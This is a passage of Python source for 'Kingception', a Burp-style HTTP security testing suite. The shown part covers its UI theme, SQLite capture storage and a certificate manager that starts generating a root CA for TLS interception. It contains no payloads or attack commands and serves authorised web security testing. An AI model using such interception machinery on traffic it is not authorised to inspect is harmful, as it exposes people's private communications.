#!/usr/bin/env python3
"""
Kingception v1.0 – Professional HTTP Security Suite (Burp‑style)
- Proxy starts automatically on 127.0.0.1:8080
- Request intercept with rich editor (Raw / Headers / Body / Pretty / Hex)
- Repeater with multi-tab, live Content-Length, history
- Full Intruder with § position markers, Sniper/Pitchfork/Cluster Bomb
- Scanner: active (15 checks) + passive (traffic analysis) + HTML report
- Decoder, Analysis, Logger, AI Analyzer
"""

import sys
import json
import threading
import ssl
import sqlite3
import uuid
import time
import re
import os
import random
import struct
import importlib.util
import socket
import gzip
import zlib
import base64
import datetime
import ipaddress
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import deque, defaultdict, Counter
from itertools import product as iterproduct
from urllib.parse import urlparse, quote as url_quote, unquote as url_unquote
import concurrent.futures
import webbrowser

# PyQt6
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QTreeWidget, QTreeWidgetItem, QPushButton,
    QLineEdit, QComboBox, QLabel, QSplitter, QTableWidget, QTableWidgetItem,
    QMenu, QMessageBox, QInputDialog, QFileDialog, QCheckBox,
    QToolBar, QStatusBar, QProgressBar, QListWidget, QListWidgetItem,
    QGroupBox, QSpinBox, QDialog, QFormLayout, QDialogButtonBox,
    QAbstractItemView, QPlainTextEdit, QScrollArea, QTextBrowser, QRadioButton,
    QGraphicsDropShadowEffect, QStackedWidget, QToolButton, QStyledItemDelegate
)
from PyQt6.QtGui import (
    QFont, QColor, QBrush, QTextCharFormat,
    QSyntaxHighlighter, QIcon, QPixmap, QPainter, QPainterPath,
    QLinearGradient, QPen
)
from PyQt6.QtCore import (
    Qt, QThread, pyqtSignal, QTimer, QSettings, QObject,
    QPropertyAnimation, QEasingCurve, pyqtProperty, QSize
)

# Optional dependencies
HAS_REQUESTS = HAS_CRYPTO = HAS_JWT = HAS_BROTLI = False
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    pass
try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTO = True
except ImportError:
    pass
try:
    import jwt as pyjwt
    HAS_JWT = True
except ImportError:
    pass
try:
    import brotli
    HAS_BROTLI = True
except ImportError:
    pass

# ========== THEME ENGINE (dark / light) ==========
_DARK_MODE = True   # toggle via Settings

class _ThemeLight:
    BG     = "#f8fafc"; PANEL  = "#ffffff"; CARD   = "#fdfdff"
    SURFACE= "#eef1f6"; BORDER = "#b7c2d0"; GLOW   = "#849ab0"
    BLUE   = "#2563eb"; PURPLE = "#7c3aed"; CYAN   = "#0891b2"
    PRIMARY2 = "#0e7490"  # button-gradient 2nd stop only — deep enough that white
                          # button text clears 4.5:1 at both gradient ends (plain
                          # CYAN only manages 3.68:1 there, which read as washed out)
    ON_ACCENT = "#ffffff"  # text color for any BLUE/PURPLE/PINK/CYAN-filled
                            # "selected" state — light theme's accents are deep
                            # enough that white text clears 4.5:1+ against all of them
    GREEN  = "#059669"; YELLOW = "#d97706"; RED    = "#dc2626"; PINK = "#db2777"
    TXT1   = "#0f172a"; TXT2   = "#334155"; TXT3   = "#64748b"; CODE = "#1e293b"
    ADD_GREEN = "#d1fae5"; DEL_RED = "#fee2e2"; SAME_BG = "#f8fafc"
    MONO = "JetBrains Mono, Fira Code, Consolas, monospace"
    UI   = "Inter, Segoe UI, system-ui, sans-serif"

class _ThemeDark:
    BG     = "#0e1016"; PANEL  = "#13151c"; CARD   = "#181b25"
    SURFACE= "#1a1d27"; BORDER = "#252836"; GLOW   = "#343848"
    BLUE   = "#4d8eff"; PURPLE = "#9b72e8"; CYAN   = "#2ec4b6"
    PRIMARY2 = CYAN       # dark theme's own CYAN already gives strong contrast
                          # once the button uses dark text instead of light (below)
    ON_ACCENT = "#0e1016"  # = BG. Dark theme's accents are bright "pop" colors
                            # against a near-black UI — white text on them measured
                            # 1.8-3.5:1 (fails AA); this near-black measures 5.4-9:1.
    GREEN  = "#3dd68c"; YELLOW = "#f0a347"; RED    = "#f45c5c"; PINK   = "#e87299"
    TXT1   = "#e0e4f0"; TXT2   = "#8891ab"; TXT3   = "#515971"; CODE   = "#c8d0e8"
    ADD_GREEN = "#1a3828"; DEL_RED = "#38181a"; SAME_BG = "#0e1016"
    MONO = "JetBrains Mono, Cascadia Code, Fira Code, Consolas, monospace"
    UI   = "Inter, SF Pro Text, Segoe UI, system-ui, sans-serif"

T: _ThemeDark = _ThemeDark()   # default dark; reassigned by toggle

def _make_css() -> str:
    bg=T.BG; pn=T.PANEL; cc=T.CARD; sf=T.SURFACE; bd=T.BORDER; gw=T.GLOW
    bl=T.BLUE; rd=T.RED; gn=T.GREEN; cy=T.CYAN; pu=T.PURPLE; pk=T.PINK; ye=T.YELLOW; oa=T.ON_ACCENT
    t1=T.TXT1; t2=T.TXT2; t3=T.TXT3; cd=T.CODE; mn=T.MONO; ui=T.UI
    # Accent buttons (Send / Start Scan / Attack! etc) are styled directly
    # per-widget — see primary_btn_css() — not through #primary/#purple
    # cascade rules, after a real-machine rendering bug in that cascade
    # path. Nothing sets those objectNames anymore, so this stylesheet
    # carries no dead rules for them.
    return f"""
/* ── Base ── */
QWidget{{background:{bg};color:{t1};font-family:{ui};font-size:13px;border:none;outline:none;}}
QMainWindow{{background:{bg};}}
QDialog{{background:qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 {cc},stop:1 {pn});border:1px solid {bd};border-radius:10px;}}

/* ── Scrollbars ── */
QScrollBar:vertical{{background:{sf};width:7px;border-radius:3px;margin:0;}}
QScrollBar::handle:vertical{{background:{gw};border-radius:3px;min-height:24px;}}
QScrollBar::handle:vertical:hover{{background:{bl};}}
QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical{{height:0;}}
QScrollBar:horizontal{{background:{sf};height:7px;border-radius:3px;margin:0;}}
QScrollBar::handle:horizontal{{background:{gw};border-radius:3px;min-width:24px;}}
QScrollBar::handle:horizontal:hover{{background:{bl};}}
QScrollBar::add-line:horizontal,QScrollBar::sub-line:horizontal{{width:0;}}

/* ── Toolbar ── */
QToolBar{{background:{pn};border:none;border-bottom:1px solid {bd};padding:6px 12px;spacing:6px;}}
QToolBar::separator{{background:{bd};width:1px;margin:6px 8px;}}
QToolBar QToolButton{{background:transparent;border:1px solid transparent;border-radius:6px;padding:4px;}}
QToolBar QToolButton:hover{{background:{sf};border-color:{bd};}}
QToolBar QToolButton:pressed{{background:{bd};}}

/* ── Status bar ── */
QStatusBar{{background:{pn};border-top:1px solid {bd};color:{t2};font-size:11px;padding:3px 12px;}}
QStatusBar::item{{border:none;}}

/* ── Main Tab Bar ── */
QTabWidget::pane{{background:{bg};border:none;}}
QTabBar{{background:{pn};border-bottom:1px solid {bd};}}
QTabBar::tab{{
    background:{pn};color:{t3};
    padding:9px 16px;font-size:12px;font-weight:500;
    border:none;border-bottom:2px solid transparent;
    margin-right:1px;min-width:70px;
}}
QTabBar::tab:selected{{color:{bl};border-bottom:2px solid {bl};background:{bl}12;font-weight:600;}}
QTabBar::tab:hover:!selected{{color:{t1};background:{sf};}}
QTabBar::tab:disabled{{color:{gw};}}
QTabBar::close-button{{subcontrol-position:right;}}

/* ── Tables / Trees ── */
QTreeWidget,QTableWidget,QListWidget{{
    background:{pn};alternate-background-color:{sf};
    border:1px solid {bd};border-radius:6px;
    gridline-color:{bd};
    selection-background-color:{bl}28;selection-color:{t1};
    outline:none;
}}
QTreeWidget::item,QTableWidget::item,QListWidget::item{{padding:5px 8px;border:none;}}
QTreeWidget::item:hover,QTableWidget::item:hover,QListWidget::item:hover{{background:{sf};}}
QTreeWidget::item:selected,QTableWidget::item:selected,QListWidget::item:selected{{background:{bl}28;color:{t1};}}
QHeaderView::section{{
    background:{sf};color:{t2};
    padding:5px 10px;border:none;
    border-right:1px solid {bd};border-bottom:1px solid {bd};
    font-size:11px;font-weight:600;
}}
QHeaderView::section:first{{border-radius:6px 0 0 0;}}

/* ── Text editors ── */
QPlainTextEdit,QTextEdit,QTextBrowser{{
    background:{pn};color:{cd};
    border:1px solid {bd};border-radius:6px;
    padding:6px;font-family:{mn};font-size:12px;
    selection-background-color:{bl}44;
}}
QPlainTextEdit:focus,QTextEdit:focus,QTextBrowser:focus{{border-color:{bl}88;}}
QPlainTextEdit:disabled,QTextEdit:disabled,QTextBrowser:disabled{{color:{t3};background:{sf};}}

/* ── Line edit ── */
QLineEdit{{
    background:{sf};color:{t1};
    border:1px solid {bd};border-radius:6px;
    padding:5px 10px;
}}
QLineEdit:focus{{border-color:{bl};background:{pn};}}
QLineEdit:hover{{border-color:{gw};}}
QLineEdit:disabled{{color:{t3};border-color:{bd};background:{pn};}}

/* ── ComboBox ── */
QComboBox{{
    background:{sf};color:{t1};
    border:1px solid {bd};border-radius:6px;
    padding:4px 8px;
}}
QComboBox:focus{{border-color:{bl};}}
QComboBox:disabled{{color:{t3};border-color:{bd};background:{pn};}}
QComboBox::drop-down{{border:none;width:20px;}}
QComboBox::down-arrow{{width:10px;height:10px;}}
QComboBox QAbstractItemView{{
    background:{pn};border:1px solid {bd};border-radius:6px;
    selection-background-color:{bl}33;outline:none;
}}

/* ── Buttons ── */
QPushButton{{
    background:{sf};color:{t1};
    border:1px solid {bd};border-radius:6px;
    padding:6px 14px;font-weight:500;
    min-height:28px;
}}
QPushButton:hover{{background:{bd};border-color:{gw};}}
QPushButton:pressed{{background:{gw};}}
QPushButton:disabled{{color:{gw};border-color:{bd};background:{sf};}}
QPushButton#danger{{background:transparent;color:{rd};border:1px solid {rd}44;}}
QPushButton#danger:hover{{background:{rd}18;border-color:{rd};}}
QPushButton#danger:pressed{{background:{rd}30;}}
QPushButton#success{{background:transparent;color:{gn};border:1px solid {gn}44;}}
QPushButton#success:hover{{background:{gn}18;border-color:{gn};}}
QPushButton#success:pressed{{background:{gn}30;}}
QPushButton#flat{{background:transparent;border:none;color:{t2};}}
QPushButton#flat:hover{{background:{sf};color:{t1};}}
QPushButton#flat:pressed{{background:{bd};}}

/* ── CheckBox ── */
QCheckBox{{color:{t2};spacing:7px;font-size:12px;}}
QCheckBox::indicator{{width:15px;height:15px;border-radius:4px;border:1px solid {gw};background:{sf};}}
QCheckBox::indicator:checked{{background:{bl};border-color:{bl};image:none;}}
QCheckBox::indicator:hover{{border-color:{bl};}}
QCheckBox:disabled{{color:{gw};}}
QCheckBox::indicator:disabled{{border-color:{bd};background:{bg};}}

/* ── RadioButton ── */
QRadioButton{{color:{t2};spacing:7px;font-size:12px;}}
QRadioButton::indicator{{width:15px;height:15px;border-radius:8px;border:1px solid {gw};background:{sf};}}
QRadioButton::indicator:checked{{background:{bl};border-color:{bl};image:none;}}
QRadioButton::indicator:hover{{border-color:{bl};}}
QRadioButton:disabled{{color:{gw};}}
QRadioButton::indicator:disabled{{border-color:{bd};background:{bg};}}

/* ── GroupBox (elevated card) ── */
QGroupBox{{
    background:{cc};border:1px solid {bd};border-radius:8px;
    margin-top:18px;padding-top:16px;font-weight:600;color:{t2};
}}
QGroupBox::title{{subcontrol-origin:margin;left:10px;padding:0 6px;font-size:11px;color:{bl};}}

/* ── ProgressBar ── */
QProgressBar{{background:{sf};border:1px solid {bd};border-radius:4px;height:5px;text-align:center;font-size:9px;color:transparent;}}
QProgressBar::chunk{{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {bl},stop:1 {cy});border-radius:4px;}}

/* ── Splitter ── */
QSplitter::handle{{background:{bd};}}
QSplitter::handle:horizontal{{width:2px;}}
QSplitter::handle:vertical{{height:2px;}}
QSplitter::handle:hover{{background:{bl};}}

/* ── Menu ── */
QMenu{{background:{pn};border:1px solid {bd};border-radius:8px;padding:4px;}}
QMenu::item{{padding:7px 20px 7px 12px;border-radius:5px;font-size:12px;}}
QMenu::item:selected{{background:{sf};color:{t1};}}
QMenu::item:disabled{{color:{gw};}}
QMenu::separator{{background:{bd};height:1px;margin:4px 8px;}}

/* ── SpinBox ── */
QSpinBox{{background:{sf};color:{t1};border:1px solid {bd};border-radius:6px;padding:4px 8px;}}
QSpinBox:focus{{border-color:{bl};}}
QSpinBox:disabled{{color:{t3};border-color:{bd};background:{pn};}}

/* ── Tooltips ── */
QToolTip{{background:{pn};color:{t1};border:1px solid {bd};border-radius:6px;padding:6px 10px;font-size:11px;}}

/* ── ScrollArea ── */
QScrollArea{{border:none;}}

/* ── FormLayout labels ── */
QLabel{{color:{t2};font-size:12px;background:transparent;}}
QLabel:disabled{{color:{gw};}}

/* ── Dialogs (QMessageBox / QInputDialog / QFileDialog) ── */
QMessageBox,QInputDialog{{background:{cc};}}
QMessageBox QLabel,QInputDialog QLabel{{color:{t1};font-size:13px;background:transparent;}}
QMessageBox QPushButton,QInputDialog QPushButton{{min-width:76px;padding:6px 16px;}}
QFileDialog{{background:{bg};}}
"""

CSS = _make_css()


def _draw_logo_pixmap(size: int) -> QPixmap:
    """Draw the Kingception badge at a given pixel size: a rounded square
    with a gold rim (the 'King' touch) and a glowing blue-to-purple
    lightning bolt. Drawn procedurally with QPainter so the whole app stays
    a single self-contained .py file with no external image assets."""
    pm = QPixmap(size, size)
    pm.fill(Qt.GlobalColor.transparent)
    p = QPainter(pm)
    p.setRenderHint(QPainter.RenderHint.Antialiasing)

    pad = size * 0.05
    rect_size = size - 2 * pad
    radius = rect_size * 0.24

    grad = QLinearGradient(pad, pad, pad + rect_size, pad + rect_size)
    grad.setColorAt(0.0, QColor("#232a52"))
    grad.setColorAt(0.55, QColor("#161a30"))
    grad.setColorAt(1.0, QColor("#0a0c16"))
    path = QPainterPath()
    path.addRoundedRect(pad, pad, rect_size, rect_size, radius, radius)
    p.fillPath(path, QBrush(grad))

    pen = QPen(QColor("#e8b64f"))
    pen.setWidthF(max(size * 0.02, 1.2))
    p.setPen(pen)
    p.setBrush(Qt.BrushStyle.NoBrush)
    p.drawPath(path)

    s = size / 256.0
    cx, cy = size / 2, size / 2
    bolt = QPainterPath()
    bolt.moveTo(cx + 20 * s, cy - 82 * s)
    bolt.lineTo(cx - 48 * s, cy + 8 * s)
    bolt.lineTo(cx - 6 * s, cy + 8 * s)
    bolt.lineTo(cx - 24 * s, cy + 82 * s)
    bolt.lineTo(cx + 52 * s, cy - 16 * s)
    bolt.lineTo(cx + 8 * s, cy - 16 * s)
    bolt.closeSubpath()

    bolt_grad = QLinearGradient(cx, cy - 82 * s, cx, cy + 82 * s)
    bolt_grad.setColorAt(0.0, QColor("#8fefff"))
    bolt_grad.setColorAt(0.5, QColor("#4d8eff"))
    bolt_grad.setColorAt(1.0, QColor("#9b72e8"))

    glow_pen = QPen(QColor(77, 142, 255, 100))
    glow_pen.setWidthF(size * 0.045)
    p.setPen(glow_pen)
    p.setBrush(Qt.BrushStyle.NoBrush)
    p.drawPath(bolt)

    p.setPen(Qt.PenStyle.NoPen)
    p.setBrush(QBrush(bolt_grad))
    p.drawPath(bolt)

    p.end()
    return pm


def primary_btn_css(style: str = "primary") -> str:
    """Guaranteed-visible styling for accent action buttons (Send, Start
    Scan, Open Browser, Attack!, etc) — set directly on each widget rather
    than via an objectName + cascaded stylesheet. The cascaded
    qlineargradient #primary rule looked correct in every check (right CSS
    text, right contrast math) but was reported genuinely invisible in dark
    mode on a real machine, so rather than keep chasing a rendering-pipeline
    gap, this sets solid, maximally-simple, directly-applied colors instead
    — no gradient, no cascade step, nothing that can fail to reach the
    widget. #purple used the identical gradient+cascade+shadow-effect
    combination and so carries the same latent risk, even though it hadn't
    been individually reported; it gets the same direct treatment here.

    Colors are solid BLUE/PURPLE/PINK/CYAN paired with ON_ACCENT text —
    the exact pairings the theme's own WCAG-contrast comments already
    validate (5.4-9:1 dark mode, 4.5:1+ light mode), so no new contrast
    math is introduced, just applied through a safer delivery mechanism."""
    oa = T.ON_ACCENT
    if style == "purple":
        base, hover, pressed = T.PURPLE, T.PINK, T.BLUE
    else:
        base, hover, pressed = T.BLUE, T.CYAN, T.PURPLE
    return (
        f"QPushButton{{background:{base};color:{oa};border:none;"
        f"border-radius:6px;font-weight:700;}}"
        f"QPushButton:hover{{background:{hover};}}"
        f"QPushButton:pressed{{background:{pressed};}}"
        f"QPushButton:disabled{{background:{T.GLOW};color:{T.TXT3};}}")


def app_icon() -> QIcon:
    """Multi-resolution app icon (crisp at taskbar/title-bar AND small tab sizes)."""
    icon = QIcon()
    for sz in (16, 24, 32, 48, 64, 128, 256):
        icon.addPixmap(_draw_logo_pixmap(sz))
    return icon


def method_color(m: str) -> str:
    return {"GET": _ThemeDark.GREEN, "POST": _ThemeDark.YELLOW, "PUT": _ThemeDark.BLUE,
            "DELETE": _ThemeDark.RED, "PATCH": _ThemeDark.PURPLE,
            "HEAD": _ThemeDark.CYAN, "OPTIONS": _ThemeDark.TXT3}.get(m.upper(), _ThemeDark.TXT2)

def status_color(c) -> str:
    try: c = int(c)
    except Exception: return _ThemeDark.TXT2
    if 200 <= c < 300: return _ThemeDark.GREEN
    if 300 <= c < 400: return _ThemeDark.CYAN
    if 400 <= c < 500: return _ThemeDark.YELLOW
    if c >= 500: return _ThemeDark.RED
    return _ThemeDark.TXT2

# Aliases so existing T.method / T.status calls still resolve cleanly
# (they are just module-level functions — no instance binding)
_ThemeDark.method  = staticmethod(lambda m: method_color(m))
_ThemeDark.status  = staticmethod(lambda c: status_color(c))
_ThemeLight.method = staticmethod(lambda m: method_color(m))
_ThemeLight.status = staticmethod(lambda c: status_color(c))



# ========== UTILITIES ==========
def safe_json(data, default=None):
    if default is None:
        default = {}
    try:
        if isinstance(data, (bytes, bytearray)):
            data = data.decode('utf-8', 'replace')
        if isinstance(data, str):
            return json.loads(data)
        return data if data is not None else default
    except Exception:
        return default

def jdump(data):
    try:
        return json.dumps(data, default=str)
    except Exception:
        return str(data)

def decode_body(body):
    if body is None:
        return ""
    if isinstance(body, str):
        return body
    try:
        return body.decode('utf-8', 'replace')
    except Exception:
        return repr(body)

def decompress(body: bytes, enc: str) -> bytes:
    try:
        if 'gzip' in enc:
            return gzip.decompress(body)
        if 'deflate' in enc:
            return zlib.decompress(body)
        if 'br' in enc and HAS_BROTLI:
            return brotli.decompress(body)
    except Exception:
        pass
    return body

def pretty_size(n: int) -> str:
    for unit in ['B', 'KB', 'MB', 'GB']:
        if n < 1024:
            return f"{n:.0f} {unit}"
        n /= 1024
    return f"{n:.1f} TB"

def _emoji_icon(char: str, size: int = 22) -> QIcon:
    """Render a single character (emoji or symbol) onto a transparent
    QPixmap at an explicit pixel size and wrap it as a QIcon — same
    no-external-assets philosophy as _draw_logo_pixmap. Exists because the
    rail buttons were cramming an icon glyph AND a caption onto two lines
    of one 6pt QPushButton font, which left too little room for the glyph
    to render legibly; this renders the icon at a fixed, adequate size
    completely independent of whatever font size the caption text uses."""
    pm = QPixmap(size, size)
    pm.fill(Qt.GlobalColor.transparent)
    p = QPainter(pm)
    p.setRenderHint(QPainter.RenderHint.Antialiasing)
    f = QFont()
    f.setPointSize(max(int(size * 0.62), 8))
    p.setFont(f)
    p.drawText(pm.rect(), Qt.AlignmentFlag.AlignCenter, char)
    p.end()
    return QIcon(pm)

def mono_font(size=10):
    f = QFont()
    f.setFamily(T.MONO.split(',')[0].strip())
    f.setPointSize(size)
    return f

# ========== DATABASE ==========
class DB:
    def __init__(self, path="kingception.db"):
        self.path = path
        self.lock = threading.Lock()
        self.cache = {}
        self.recent = deque(maxlen=10000)
        self._init()

    def _init(self):
        with sqlite3.connect(self.path) as c:
            c.execute("PRAGMA journal_mode=WAL")
            c.execute("PRAGMA synchronous=NORMAL")
            c.executescript("""
                CREATE TABLE IF NOT EXISTS messages(
                    id TEXT PRIMARY KEY, url TEXT, method TEXT, host TEXT, port INTEGER,
                    path TEXT, scheme TEXT, req_headers TEXT, req_body BLOB,
                    resp_headers TEXT, resp_body BLOB, status INTEGER,
                    ts REAL, dur REAL, tags TEXT, notes TEXT, color TEXT,
                    content_type TEXT, resp_size INTEGER, source_ip TEXT
                );
                CREATE TABLE IF NOT EXISTS match_rules(
                    id TEXT PRIMARY KEY, name TEXT, pattern TEXT, replace TEXT,
                    apply_to TEXT, scope TEXT, enabled INTEGER, is_regex INTEGER
                );
                CREATE TABLE IF NOT EXISTS scan_results(
                    id TEXT PRIMARY KEY, url TEXT, vuln_type TEXT, severity TEXT,
                    desc TEXT, req_ev TEXT, resp_ev TEXT, fix TEXT, cwe TEXT,
                    cvss REAL, ts REAL, confidence TEXT
                );
                CREATE TABLE IF NOT EXISTS auto_responders(
                    id TEXT PRIMARY KEY, match TEXT, status INTEGER, body TEXT, headers TEXT,
                    enabled INTEGER, is_regex INTEGER
                );
                CREATE INDEX IF NOT EXISTS idx_ts ON messages(ts DESC);
                CREATE INDEX IF NOT EXISTS idx_host ON messages(host);
                CREATE INDEX IF NOT EXISTS idx_status ON messages(status);
            """)

    def save_msg(self, m: dict):
        with self.lock:
            self.cache[m['id']] = m
            # IMPORTANT: store the full dict, not just the ID.
            # Every consumer (_export_har, _export_json, _export_csv,
            # _export_curl, _quick_export, _analysis_tab) iterates this
            # deque calling m.get(...) on each entry — pushing a bare ID
            # string here caused AttributeError: 'str' object has no
            # attribute 'get' on every live-captured request.
            self.recent.appendleft(m)
            try:
                with sqlite3.connect(self.path) as c:
                    c.execute("""INSERT OR REPLACE INTO messages VALUES
                        (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""", (
                        m['id'], m['url'], m['method'], m['host'], m.get('port', 80),
                        m.get('path', '/'), m.get('scheme', 'http'),
                        jdump(m.get('req_headers', {})), m.get('req_body'),
                        jdump(m.get('resp_headers', {})), m.get('resp_body'),
                        m.get('status', 0), m.get('ts', time.time()), m.get('dur', 0),
                        jdump(m.get('tags', [])), m.get('notes', ''), m.get('color', ''),
                        m.get('content_type', ''), m.get('resp_size', 0),
                        m.get('source_ip', '')
                    ))
            except Exception as e:
                print(f"[DB] {e}")

    def get_msg(self, mid: str) -> Optional[dict]:
        if mid in self.cache:
            return self.cache[mid]
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                r = c.execute("SELECT * FROM messages WHERE id=?", (mid,)).fetchone()
                if r:
                    d = dict(r)
                    self.cache[mid] = d
                    return d
        except Exception:
            pass
        return None

    def list_msgs(self, limit=1000, method=None, status_f=None, search=None, host=None) -> List[dict]:
        q = "SELECT id,url,method,status,resp_size,dur,ts,host,path FROM messages WHERE 1=1"
        p = []
        if method and method != "All":
            q += " AND method=?"
            p.append(method)
        if host:
            q += " AND host LIKE ?"
            p.append(f"%{host}%")
        if status_f and status_f != "All":
            lo = int(status_f[0]) * 100
            hi = lo + 100
            q += " AND status>=? AND status<?"
            p += [lo, hi]
        if search:
            q += " AND (url LIKE ? OR host LIKE ?)"
            p += [f"%{search}%"] * 2
        q += " ORDER BY ts DESC LIMIT ?"
        p.append(limit)
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                return [dict(r) for r in c.execute(q, p).fetchall()]
        except Exception:
            return []

    def hosts(self) -> List[Tuple[str, int]]:
        try:
            with sqlite3.connect(self.path) as c:
                rows = c.execute("""
                    SELECT host, COUNT(*) cnt FROM messages
                    GROUP BY host ORDER BY cnt DESC LIMIT 200
                """).fetchall()
                return [(r[0], r[1]) for r in rows]
        except Exception:
            return []

    def stats(self) -> dict:
        try:
            with sqlite3.connect(self.path) as c:
                total = c.execute("SELECT COUNT(*) FROM messages").fetchone()[0]
                hosts = c.execute("SELECT COUNT(DISTINCT host) FROM messages").fetchone()[0]
                scans = c.execute("SELECT COUNT(*) FROM scan_results").fetchone()[0]
                top = c.execute("SELECT host, COUNT(*) cnt FROM messages GROUP BY host ORDER BY cnt DESC LIMIT 10").fetchall()
                statuses = c.execute("SELECT status//100 * 100 as sc, COUNT(*) cnt FROM messages GROUP BY sc").fetchall()
                methods = c.execute("SELECT method, COUNT(*) cnt FROM messages GROUP BY method ORDER BY cnt DESC").fetchall()
                return {
                    'total': total,
                    'hosts': hosts,
                    'scans': scans,
                    'top_hosts': top,
                    'statuses': {f"{s[0]}": s[1] for s in statuses},
                    'methods': dict(methods)
                }
        except Exception:
            return {}

    def clear(self):
        with self.lock:
            self.cache.clear()
            self.recent.clear()
            with sqlite3.connect(self.path) as c:
                c.execute("DELETE FROM messages")

    def save_rule(self, r):
        with sqlite3.connect(self.path) as c:
            c.execute("INSERT OR REPLACE INTO match_rules VALUES(?,?,?,?,?,?,?,?)",
                      (r.id, r.name, r.pattern, r.replace, r.apply_to, r.scope, int(r.enabled), int(r.is_regex)))

    def load_rules(self) -> List:
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                rows = c.execute("SELECT * FROM match_rules").fetchall()
                rules = []
                for r in rows:
                    @dataclass
                    class MRule:
                        id: str; name: str; pattern: str; replace: str
                        apply_to: str; scope: str; enabled: bool; is_regex: bool
                    rules.append(MRule(r['id'], r['name'], r['pattern'], r['replace'],
                                       r['apply_to'], r['scope'], bool(r['enabled']), bool(r['is_regex'])))
                return rules
        except Exception:
            return []

    def save_scan(self, r: dict):
        with sqlite3.connect(self.path) as c:
            c.execute("INSERT OR REPLACE INTO scan_results VALUES(?,?,?,?,?,?,?,?,?,?,?,?)",
                      (r['id'], r['url'], r.get('vuln_type', ''), r.get('severity', ''),
                       r.get('desc', ''), r.get('req_ev', ''), r.get('resp_ev', ''),
                       r.get('fix', ''), r.get('cwe', ''), r.get('cvss', 0),
                       r.get('ts', time.time()), r.get('confidence', 'medium')))

    def list_scans(self) -> list:
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                return [dict(r) for r in c.execute("SELECT * FROM scan_results ORDER BY ts DESC").fetchall()]
        except Exception:
            return []

    def save_responder(self, r):
        with sqlite3.connect(self.path) as c:
            c.execute("INSERT OR REPLACE INTO auto_responders VALUES(?,?,?,?,?,?,?)",
                      (r.id, r.match, r.status, r.body, r.headers, int(r.enabled), int(r.is_regex)))

    def load_responders(self) -> list:
        try:
            with sqlite3.connect(self.path) as c:
                c.row_factory = sqlite3.Row
                rows = c.execute("SELECT * FROM auto_responders").fetchall()
                @dataclass
                class ARule:
                    id: str; match: str; status: int; body: str; headers: str
                    enabled: bool; is_regex: bool
                return [ARule(r['id'], r['match'], r['status'], r['body'], r['headers'],
                              bool(r['enabled']), bool(r['is_regex'])) for r in rows]
        except Exception:
            return []

    def sitemap(self) -> dict:
        try:
            with sqlite3.connect(self.path) as c:
                rows = c.execute("SELECT host, path, method FROM messages").fetchall()
                sm = defaultdict(lambda: defaultdict(set))
                for host, path, method in rows:
                    clean = (path or '/').split('?')[0]
                    sm[host][clean].add(method)
                return {h: {p: list(m) for p, m in paths.items()} for h, paths in sm.items()}
        except Exception:
            return {}

# ========== CERTIFICATE MANAGER ==========
class CertManager:
    def __init__(self):
        self.base = Path.home() / 'kingception'          # NO leading dot
        self.base.mkdir(exist_ok=True)
        self.cert_dir = self.base / 'certs'
        self.cert_dir.mkdir(exist_ok=True)
        self.ca_crt = self.base / 'kingception-ca.crt'   # renamed
        self.ca_key = self.base / 'kingception-ca.key'   # renamed
        self._ca_cert = None
        self._ca_key = None
        self._host_cache = {}
        self._load_ca()

    def _load_ca(self) -> bool:
        if not HAS_CRYPTO:
            return False
        if self.ca_crt.exists() and self.ca_key.exists():
            try:
                with open(self.ca_crt, 'rb') as f:
                    self._ca_cert = x509.load_pem_x509_certificate(f.read(), default_backend())
                with open(self.ca_key, 'rb') as f:
                    self._ca_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
                return True
            except Exception:
                pass
        return False

    def has_ca(self) -> bool:
        return self._ca_cert is not None

    def ca_spki_hash(self) -> Optional[str]:
        """Base64 SHA-256 of the CA's SubjectPublicKeyInfo — what Chrome's
        --ignore-certificate-errors-spki-list flag wants.

        This replaces blanket --ignore-certificate-errors, which disables
        certificate validation for *every* site the embedded browser visits
        (not just our own MITM'd traffic) and triggers Chrome's permanent
        "unsupported command-line flag" warning banner. Pinning the SPKI
        hash gets the same "no cert nag for our own cert" result while
        leaving normal validation intact for everything else.
        """
        if not self._ca_cert:
            return None
        spki = self._ca_cert.public_key().public_bytes(
            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
        digest = hashes.Hash(hashes.SHA256())
        digest.update(spki)
        return base64.b64encode(digest.finalize()).decode()

    def generate_ca(self) -> Tuple[str, str]:
        if not HAS_CRYPTO:
            raise RuntimeError("Install cryptography: pip install cryptography")
        key = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
        name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Kingception Security Suite"),
            x509.NameAttribute(NameOID.COMMON_NAME, "Kingception Root CA"),
        ])
        # Backdate by 1 day to absorb client/server clock skew — without this,
        # a machine whose clock is even slightly ahead of the generating
        # machine will see "certificate not yet valid" TLS errors.
        now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) \
              - datetime.timedelta(days=1)
        cert = (x509.CertificateBuilder()
                .subject_name(name)
                .issuer_name(name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + datetime.timedelta(days=3650))
                .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
                .add_extension(x509.KeyUsage(digital_signature=True, key_cert_sign=True, crl_sign=True,
                                             content_commitment=False, key_encipherment=False,
                                             data_encipherment=False, key_agreement=False,
                                             encipher_only=False, decipher_only=False), critical=True)
